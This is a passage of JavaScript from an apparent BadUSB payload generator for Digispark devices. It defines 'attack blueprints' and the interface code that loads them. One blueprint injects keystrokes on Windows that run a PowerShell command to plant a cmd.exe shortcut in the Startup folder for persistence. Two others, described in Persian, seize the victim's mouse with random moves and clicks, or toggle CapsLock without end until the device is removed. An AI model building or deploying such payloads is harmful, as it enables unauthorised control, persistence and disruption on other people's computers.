            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Run Dialog' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'shell:startup', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Create shortcut to CMD in Startup folder' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -c "Add-Type -AssemblyName System.Windows.Forms; $sh = New-Object -ComObject WScript.Shell; $shortcut = $sh.CreateShortcut(\'$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cmd.lnk\'); $shortcut.TargetPath = \'cmd.exe\'; $shortcut.Save()"', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1500 },
                    { type: 'comment', value: 'CMD will open on next reboot. Delete the .lnk file to revert.' }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_mouse_freakout: {
        description: "این پی‌لود نشانگر موس رو به صورت تصادفی در اطراف صفحه حرکت می‌ده و کلیک می‌کنه تا کاربر رو گیج کنه. **تا خاموش شدن Digispark ادامه داره!**",
        type: 'digispark',
        actions: (os) => {
            return [
                { type: 'comment', value: 'Random Mouse Movement and Clicks (continues in loop())' },
                { type: 'custom_code', value: `
  // Random mouse movement
  DigiKeyboard.move(random(-50, 50), random(-50, 50), 0);
  DigiKeyboard.delay(random(50, 200));

  // Random clicks
  if (random(0, 100) < 20) { // 20% chance to click
    DigiKeyboard.click(MOUSE_BUTTON_LEFT);
    DigiKeyboard.delay(random(10, 50));
  }
  // This code will run repeatedly in the loop() function
  ` }
            ];
        }
    },
    digi_capslock_spam_permanent: {
        description: "این پی‌لود به طور دائم کلید CapsLock رو روشن/خاموش می‌کنه و کاربر رو مجبور می‌کنه با حروف بزرگ تایپ کنه. **تا خاموش شدن Digispark ادامه داره!**",
        type: 'digispark',
        actions: (os) => {
            return [
                { type: 'comment', value: 'Permanently toggle CapsLock (runs in loop())' },
                { type: 'custom_code', value: `
  DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK);
  DigiKeyboard.delay(200); // Adjust delay for desired speed
  ` }
            ];
        }
    }    
};


function loadBlueprint() {
    const blueprintSelect = document.getElementById('blueprintSelect');
    const selectedBlueprintId = blueprintSelect.value;
    const blueprintDescriptionDiv = document.getElementById('blueprintDescription');
    const outputCode = document.getElementById('outputCode');

    if (!selectedBlueprintId) {
        blueprintDescriptionDiv.innerHTML = '<p>Select a blueprint to see its description and generated payload.</p>';
        outputCode.value = '';
        return;
    }

    const blueprint = attackBlueprints[selectedBlueprintId];

    if (!blueprint) {
        blueprintDescriptionDiv.innerHTML = '<p class="error-message">Blueprint not found!</p>';
        outputCode.value = '';
        return;
    }

    blueprintDescriptionDiv.innerHTML = `<p>${blueprint.description}</p>`;

    if (blueprint.type === 'digispark') {
        showTab('digispark'); // Switch to Digispark tab
        document.getElementById('digisparkPayloadActions').innerHTML = ''; // Clear existing actions
        digisparkActionCounter = 0; // Reset counter

        const os = document.getElementById('osSelect').value;
        const actionsToLoad = blueprint.actions(os);
        actionsToLoad.forEach(action => {
            addDigisparkAction(action.type, action.value, action.delay);
        });
        generateDigisparkCode(); // Generate code for the loaded actions
    } else {
        // This 'else' block would handle Android or other types if they were enabled.
        // For this project, it implies an error or an unhandled blueprint type.
        console.warn("Unhandled blueprint type or tab is hidden:", blueprint.type);
        blueprintDescriptionDiv.innerHTML = '<p class="error-message">Blueprint type not supported in current view or blueprint configuration error!</p>';
        outputCode.value = '';
    }
}

// Override default event listeners for blueprints to simplify tab management
const originalShowTab = showTab;
showTab = (tabId) => {
    originalShowTab(tabId); // Call the original showTab function

    // When going to blueprints tab, clear blueprint details
    if (tabId === 'blueprints') {
        document.getElementById('blueprintDescription').innerHTML = '<p>Select a blueprint to see its description and generated payload.</p>';
        document.getElementById('outputCode').value = '';
        document.getElementById('blueprintSelect').value = ''; // Reset blueprint selection
    } else if (tabId === 'digispark') {
        // Re-generate code if switching back to Digispark
        generateDigisparkCode();
    }
    // Android tab is now always hidden, so no specific logic for switching to/from it here.
};